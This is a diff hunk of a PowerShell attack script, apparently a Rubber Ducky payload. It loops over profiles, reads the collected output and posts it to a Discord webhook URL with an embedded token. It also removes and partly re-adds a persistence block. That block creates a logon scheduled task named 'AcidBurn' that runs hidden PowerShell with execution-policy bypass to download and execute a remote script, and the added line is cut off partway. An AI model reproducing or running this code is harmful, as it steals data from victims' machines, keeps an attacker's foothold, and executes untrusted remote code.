@@ -16,13 +16,7 @@ foreach ($p in $profiles) {
 $body = Get-Content $out -Raw
 $payload = @{ content = $body } | ConvertTo-Json
 Invoke-RestMethod -Uri "https://discord.com/api/webhooks/1519137397022130196/X1Pyzeu-cYDoWXpEb5Evo9KFNKgpoeOhdLEsS9NbLWy5gvKkvqeqOZlxuCQV92Xi5XYT" -Method Post -Body $payload -ContentType "application/json"
+
 # --- PERSISTENCE ---
 $taskName = "AcidBurn"
-$cmd = "powershell -w hidden -ep bypass -c `"iex(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/stargosg/Ducky/refs/heads/main/x.ps1')`""
-
-schtasks /create /tn $taskName /tr $cmd /sc onlogon /f 2>$null
-try {
-    Invoke-RestMethod -Uri "https://discord.com/api/webhooks/..." -Method Post -Body $payload -ContentType "application/json"
-} catch {
-    $_ | Out-File "$env:TEMP\ab_error.txt"
-}
+$cmd = "powershell -w hidden -ep bypass -c `"iex(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/stargosg/Ducky/
